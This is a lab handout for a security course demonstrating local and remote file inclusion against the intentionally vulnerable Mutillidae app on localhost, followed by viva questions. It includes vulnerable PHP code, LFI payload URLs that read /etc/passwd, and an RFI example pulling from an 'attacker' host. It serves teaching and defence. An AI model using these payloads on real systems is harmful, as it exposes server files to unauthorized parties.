################################################################
# EXP 09 - Demonstration of File Inclusion Vulnerabilities
################################################################

----------------------------------------------------------------
WHAT THIS EXPERIMENT COVERS (say this if asked)
----------------------------------------------------------------
AIM: Demonstrate file inclusion vulnerabilities and how improper handling of
user-controlled file paths lets unauthorized files be accessed/included.

TOPIC / CONCEPTS:
- File Inclusion = app dynamically includes a file based on user input without
  validating the supplied path.
  Example:  http://localhost/index.php?page=home   (page param controls file)
  Vulnerable code:  include($_GET['page']);
- LOCAL FILE INCLUSION (LFI) = attacker makes the app include/read a file on
  the SAME server (e.g. /etc/passwd) via path manipulation / directory traversal.
- REMOTE FILE INCLUSION (RFI) = app includes a file from a REMOTE server
  (e.g. ?page=http://attacker/file.txt). More dangerous; modern PHP usually
  disables it (allow_url_include=Off).
- Prevention: avoid user input in include functions, use an ALLOWLIST of
  permitted files, map user input to predefined file names, validate/canonicalize
  paths, block directory traversal, disable remote inclusion.
  Safer pattern:
     $pages = ["home"=>"home.php","about"=>"about.php"];
     include($pages[$_GET["page"]]);

----------------------------------------------------------------
SETUP (do this directly - works standalone)
----------------------------------------------------------------
sudo systemctl start docker
sudo docker run -d --name mutillidae -p 8081:80 citizenstig/nowasp
# if "name already in use":  sudo docker start mutillidae
sudo docker ps
# Open http://127.0.0.1:8081
#  - if "database offline" -> click "setup/reset the DB"
#  - Toggle Security until: Security Level 0 (Hosed)
# Optional Burp:  burpsuite -> Temporary Project -> Open Browser

# MENU: A5 Broken Access Control -> Insecure Direct Object References
#       -> Arbitrary File Inclusion

----------------------------------------------------------------
STEPS (paste URLs in browser)
----------------------------------------------------------------
# Normal use
http://127.0.0.1:8081/index.php?page=arbitrary-file-inclusion.php

# LFI test - target file ALWAYS exists on Linux (no setup needed)
http://127.0.0.1:8081/index.php?page=/etc/passwd

# If passwd shows nothing, try:
http://127.0.0.1:8081/index.php?page=/etc/hostname

# If the file contents appear in the page = LFI confirmed.

# OPTIONAL (Burp): Intercept ON -> load the LFI URL -> show the
# GET /index.php?page=/etc/passwd request + file contents in the response.

# RFI (explain): ?page=http://attacker/file.txt would pull a remote file;
# modern PHP disables it (allow_url_include=Off) -> demonstrate LFI, explain RFI.

----------------------------------------------------------------
VIVA
----------------------------------------------------------------
Q: What is a File Inclusion vulnerability?
A: When an app includes a file chosen by user input without validation.
Q: Difference between LFI and RFI?
A: LFI includes a file on the same (local) server; RFI includes a file from a
   remote server.
Q: What is Local File Inclusion?
A: Including/reading a local server file via a manipulated file-path parameter.
